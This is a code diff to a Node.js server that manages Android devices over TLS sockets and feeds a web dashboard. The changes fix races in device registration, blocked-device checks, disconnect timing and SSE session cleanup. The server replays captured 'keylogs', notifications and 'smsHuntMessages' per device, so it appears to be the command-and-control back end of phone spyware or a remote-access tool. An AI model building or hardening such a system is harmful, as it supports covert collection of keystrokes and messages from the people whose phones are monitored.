@@ -1279,10 +1279,36 @@ const tcpClients = new Map();          // connId → TCP socket
 const sseClients = new Map();          // clientId → { res, token }
 /** @type {Map<string, string>} */
 const deviceToTcp = new Map();         // deviceId → primary TCP connId
+/** @type {Map<string, Set<string>>} */
+const pendingPrimaryRegistrations = new Map(); // deviceId → TCP connIds awaiting registration
 /** @type {Map<string, string>} */
 const deviceToStreamTcp = new Map();   // deviceId → stream channel TCP connId
 /** @type {Map<string, string>} */
 const deviceToLiveTcp = new Map();     // deviceId → live channel TCP connId
+
+function markPendingPrimaryRegistration(deviceId, clientId) {
+    let pending = pendingPrimaryRegistrations.get(deviceId);
+    if (!pending) {
+        pending = new Set();
+        pendingPrimaryRegistrations.set(deviceId, pending);
+    }
+    pending.add(clientId);
+    const conn = tcpClients.get(clientId);
+    if (conn) conn.pendingRegistrationDeviceId = deviceId;
+}
+
+function clearPendingPrimaryRegistration(deviceId, clientId) {
+    if (!deviceId) return;
+    const pending = pendingPrimaryRegistrations.get(deviceId);
+    if (pending) {
+        pending.delete(clientId);
+        if (pending.size === 0) pendingPrimaryRegistrations.delete(deviceId);
+    }
+    const conn = tcpClients.get(clientId);
+    if (conn?.pendingRegistrationDeviceId === deviceId) {
+        delete conn.pendingRegistrationDeviceId;
+    }
+}
 /** @type {Map<string, {sseId:string, command:string, deviceId:string, timer:NodeJS.Timeout, order:number}>} */
 const pendingCmds = new Map();         // commandId → pending info
 let pendingCommandOrder = 0;
@@ -1500,17 +1526,16 @@ async function processMessage(clientId, clientType, event, data) {
         // Kept on the device record so per-user dashboards can scope their list.
         const accessId = (data && (data.accessId || (deviceInfo && deviceInfo.accessId))) || '';
         const conn = tcpClients.get(clientId);
+        if (conn) markPendingPrimaryRegistration(deviceId, clientId);
 
         // A blocked device must not be able to come back simply by opening a
         // new TCP connection. MongoDB is authoritative; Redis and the
         // in-memory registry keep the protection active during a DB outage.
-        let storedDevice = null;
-        try {
-            storedDevice = await Device.findOne({ deviceId }).select('blocked').lean().exec();
-        } catch (_) {}
-        const redisDevice = await R.getDevice(deviceId);
+        let redisDevice = null;
+        try { redisDevice = await R.getDevice(deviceId); } catch (_) {}
         const memoryDevice = inMemoryDevices.get(deviceId);
-        if (storedDevice?.blocked || redisDevice?.blocked || memoryDevice?.blocked) {
+        if (redisDevice?.blocked || memoryDevice?.blocked) {
+            clearPendingPrimaryRegistration(deviceId, clientId);
             if (conn) {
                 tcpSend(conn, 'device:registered', {
                     success: false,
@@ -1521,6 +1546,78 @@ async function processMessage(clientId, clientType, event, data) {
                 tcpClients.delete(clientId);
             }
             log('AUTH', `Rejected blocked device registration: ${deviceId}`, 'warn');
+            return;
+        }
+
+        const info = { model: deviceInfo?.model, manufacturer: deviceInfo?.manufacturer,
+                       androidVersion: deviceInfo?.androidVersion, name: deviceInfo?.name,
+                       screenWidth: deviceInfo?.screenWidth, screenHeight: deviceInfo?.screenHeight };
+        const taskQuery = accessId
+            ? { $or: [{ accessId }, { accessId: '' }, { deviceId }] }
+            : { $or: [{ accessId: '' }, { deviceId }] };
+        // Task restoration and the atomic device upsert can proceed together.
+        const deviceTasksPromise = Task.find(taskQuery)
+            .sort({ updatedAt: -1 })
+            .lean()
+            .catch(() => []);
+        const now = new Date();
+        const setFields = {
+            isOnline: true,
+            lastSeen: now,
+            ...Object.fromEntries(
+                Object.entries(info)
+                    .filter(([, value]) => value !== undefined)
+                    .map(([key, value]) => [`deviceInfo.${key}`, value]),
+            ),
+            ...(accessId ? { accessId } : {}),
+            ...(deviceInfo?.name ? { deviceName: deviceInfo.name } : {}),
+        };
+        const insertFields = {
+            deviceId,
+            registeredAt: now,
+            blocked: false,
+            ...(!accessId ? { accessId: '' } : {}),
+            ...(!deviceInfo?.name ? { deviceName: deviceId } : {}),
+        };
+        try {
+            await Device.findOneAndUpdate(
+                { deviceId, blocked: { $ne: true } },
+                { $set: setFields, $setOnInsert: insertFields },
+                { upsert: true, new: true, setDefaultsOnInsert: true, runValidators: true },
+            ).maxTimeMS(MONGO_OPERATION_TIMEOUT_MS).exec();
+        } catch (e) {
+            // A blocked record does not match the upsert filter. Its unique
+            // deviceId turns the attempted insert into E11000; confirm that
+            // case before rejecting, while preserving the normal DB-outage
+            // in-memory fallback.
+            if (e?.code === 11000) {
+                let blockedRecord = null;
+                try {
+                    blockedRecord = await Device.findOne({ deviceId })
+                        .select('blocked')
+                        .lean()
+                        .exec();
+                } catch (_) {}
+                if (blockedRecord?.blocked) {
+                    clearPendingPrimaryRegistration(deviceId, clientId);
+                    if (conn) {
+                        tcpSend(conn, 'device:registered', {
+                            success: false,
+                            deviceId,
+                            error: 'This device is blocked by the administrator',
+                        });
+                        conn.destroy();
+                        tcpClients.delete(clientId);
+                    }
+                    log('AUTH', `Rejected blocked device registration: ${deviceId}`, 'warn');
+                    return;
+                }
+            }
+            log('DB', 'registration upsert error: ' + e.message, 'warn');
+        }
+
+        if (conn?.destroyed) {
+            clearPendingPrimaryRegistration(deviceId, clientId);
             return;
         }
 
@@ -1541,12 +1638,12 @@ async function processMessage(clientId, clientType, event, data) {
             conn.deviceId = deviceId;
             conn.lastPong = Date.now();
             deviceToTcp.set(deviceId, clientId);
+            // Map the new socket before clearing pending state. A disconnect
+            // grace timer can then immediately see the replacement.
+            clearPendingPrimaryRegistration(deviceId, clientId);
         }
 
         // Always update in-memory registry
-        const info = { model: deviceInfo?.model, manufacturer: deviceInfo?.manufacturer,
-                       androidVersion: deviceInfo?.androidVersion, name: deviceInfo?.name,
-                       screenWidth: deviceInfo?.screenWidth, screenHeight: deviceInfo?.screenHeight };
         const existing = inMemoryDevices.get(deviceId) || {};
         const prevLastSeen = existing.lastSeen ? new Date(existing.lastSeen).getTime() : 0;
         const prevOnline   = !!existing.isOnline;
@@ -1560,46 +1657,21 @@ async function processMessage(clientId, clientType, event, data) {
             isOnline: true, lastSeen: new Date() };
         inMemoryDevices.set(deviceId, deviceRecord);
 
-        // Publish the online state as soon as it is authoritative in memory.
-        // Device persistence, task restore, and optional integrations can take
-        // longer and should not make the TCP connection look absent in the UI.
-        if (isFreshConnect) {
-            broadcastDashScoped('device:connected', {
-                deviceId,
-                deviceInfo,
-                accessId,
-                timestamp: deviceRecord.lastSeen,
-            }, accessId || null);
-        }
+        // Publish every successful primary registration so a reconnect is
+        // visible immediately too. Keep the freshness gate for external
+        // notifications and task dispatch below, not dashboard state.
+        broadcastDashScoped('device:connected', {
+            deviceId,
+            deviceInfo,
+            accessId,
+            timestamp: deviceRecord.lastSeen,
+        }, accessId || null);
 
         // Persist to Redis
         R.saveDevice(deviceId, deviceRecord).catch(() => {});
 
-        // Persist / update (optional MongoDB)
-        try {
-            let dev = await Device.findOne({ deviceId });
-            if (!dev) {
-                dev = new Device({ deviceId, deviceName: deviceInfo?.name || deviceId,
-                                   deviceInfo: info, accessId: accessId || '',
-                                   registeredAt: new Date(), isOnline: true });
-            } else {
-                dev.isOnline  = true;
-                dev.lastSeen  = new Date();
-                dev.deviceInfo = { ...(dev.deviceInfo || {}), ...info };
-                if (accessId) dev.accessId = accessId;
-                dev.markModified('deviceInfo');
-            }
-            await dev.save();
-        } catch (e) { log('DB', 'save error: ' + e.message, 'warn'); }
-
         // Load saved tasks from MongoDB scoped to this accessId and send them to the device
-        let deviceTasks = [];
-        try {
-            const taskQuery = accessId
-                ? { $or: [{ accessId }, { accessId: '' }, { deviceId }] }
-                : { $or: [{ accessId: '' }, { deviceId }] };
-            deviceTasks = await Task.find(taskQuery).sort({ updatedAt: -1 }).lean();
-        } catch (_) {}
+        const deviceTasks = await deviceTasksPromise;
 
         // Ack back to device
         if (conn) tcpSend(conn, 'device:registered', { success: true, deviceId, tasks: deviceTasks });
@@ -2263,6 +2335,9 @@ const tcpServer = tls.createServer({ key: tlsKey, cert: tlsCert, allowHalfOpen: 
     });
 
     conn.on('close', async () => {
+        if (conn.pendingRegistrationDeviceId) {
+            clearPendingPrimaryRegistration(conn.pendingRegistrationDeviceId, id);
+        }
         tcpClients.delete(id);
         if (conn.deviceId) {
             if (conn.channelType === 'stream') {
@@ -2283,11 +2358,18 @@ const tcpServer = tls.createServer({ key: tlsKey, cert: tlsCert, allowHalfOpen: 
                 // rotation, mobile network handoffs) don't produce false offline flashes in the UI.
                 const disconnectedDeviceId = conn.deviceId;
                 const disconnectedConnId   = id;
-                setTimeout(async () => {
+                const finishDisconnect = async () => {
                     // Re-check: if a new primary has registered in the meantime, skip broadcast
                     if (deviceToTcp.get(disconnectedDeviceId) !== disconnectedConnId &&
                         deviceToTcp.has(disconnectedDeviceId)) {
                         return; // Device reconnected during grace period — suppress
+                    }
+                    // A new socket may already be handshaking or waiting on the
+                    // database registration upsert. Keep the disconnect grace
+                    // pending until it is accepted or its connection closes.
+                    if (pendingPrimaryRegistrations.get(disconnectedDeviceId)?.size) {
+                        setTimeout(finishDisconnect, 250);
+                        return;
                     }
                     log('TCP', `Device ${disconnectedDeviceId} disconnected`);
                     deviceToTcp.delete(disconnectedDeviceId);
@@ -2303,7 +2385,8 @@ const tcpServer = tls.createServer({ key: tlsKey, cert: tlsCert, allowHalfOpen: 
                         broadcastDashScoped('device:disconnected', { deviceId: disconnectedDeviceId, accessId: aid, timestamp: new Date() }, aid || null);
                     }
                     broadcastDeviceList();
-                }, 3000);
+                };
+                setTimeout(finishDisconnect, 3000);
             }
         }
     });
@@ -2508,11 +2591,35 @@ app.get('/api/events', async (req, res) => {
     res.setHeader('X-Accel-Buffering', 'no');  // disable nginx buffering
     res.flushHeaders();
 
+    let keepAlive = null;
+    let cleanedUp = false;
+    const cleanupSseClient = () => {
+        if (cleanedUp) return;
+        cleanedUp = true;
+        if (keepAlive) clearInterval(keepAlive);
+        sseClients.delete(clientId);
+        realtimeSseState.delete(clientId);
+        log('SSE', `Dashboard disconnected ${clientId}`);
+        // Do NOT cancel pending commands when SSE disconnects — the dashboard reconnects
+        // within 3 s (see useTcpStream.js retry) and results are now broadcast to all
+        // SSE clients, so the reconnected tab will still receive the command:result.
+        // Only clear the sseId reference so the old (dead) client is no longer targeted.
+        for (const [, p] of pendingCmds) {
+            if (p.sseId === clientId) p.sseId = null;
+        }
+        res.off('close', cleanupSseClient);
+        req.off('aborted', cleanupSseClient);
+    };
     sseClients.set(clientId, { res, token, role, accessId, userId });
+    // Attach before any database/history awaits so disconnects during replay
+    // cannot leave stale dashboard sessions in the registry.
+    res.on('close', cleanupSseClient);
+    req.on('aborted', cleanupSseClient);
     log('SSE', `Dashboard connected ${clientId} (${role}${accessId ? ' / ' + accessId : ''})`);
 
     // Immediately push device list + command registry, scoped per role
     const list = await getDeviceList(role === 'user' ? accessId : null, { fast: true });
+    if (cleanedUp || res.destroyed) return;
     sseSend(clientId, 'device:list', list);
     sseSend(clientId, 'commands:registry', COMMANDS);
     // Tell the client its own sseId so it can include it in HTTP requests
@@ -2523,6 +2630,7 @@ app.get('/api/events', async (req, res) => {
     try {
         const deviceIds = list.map(d => d.deviceId).filter(Boolean);
         for (const did of deviceIds) {
+            if (cleanedUp || res.destroyed) break;
             const [keylogs, notifications, activity, smsHuntMessages] = await Promise.all([
                 R.getKeylogs(did),
                 R.getNotifications(did),
@@ -2536,27 +2644,15 @@ app.get('/api/events', async (req, res) => {
         }
     } catch (e) { log('SSE', `History replay error: ${e.message}`, 'warn'); }
 
+    if (cleanedUp || res.destroyed) return;
+
     // Keep the connection alive with a comment every 25 s
-    const keepAlive = setInterval(() => {
-        if (!res.writableEnded) {
+    keepAlive = setInterval(() => {
+        if (!res.writableEnded && !res.destroyed) {
             res.write(': ka\n\n');
             if (typeof res.flush === 'function') res.flush();
         }
     }, 25000);
-
-    req.on('close', () => {
-        clearInterval(keepAlive);
-        sseClients.delete(clientId);
-        realtimeSseState.delete(clientId);
-        log('SSE', `Dashboard disconnected ${clientId}`);
-        // Do NOT cancel pending commands when SSE disconnects — the dashboard reconnects
-        // within 3 s (see useTcpStream.js retry) and results are now broadcast to all
-        // SSE clients, so the reconnected tab will still receive the command:result.
-        // Only clear the sseId reference so the old (dead) client is no longer targeted.
-        for (const [, p] of pendingCmds) {
-            if (p.sseId === clientId) p.sseId = null;
-        }
-    });
 });
 
 // ── Dashboard ping — measure server RTT over HTTP/TCP ────────────────────────
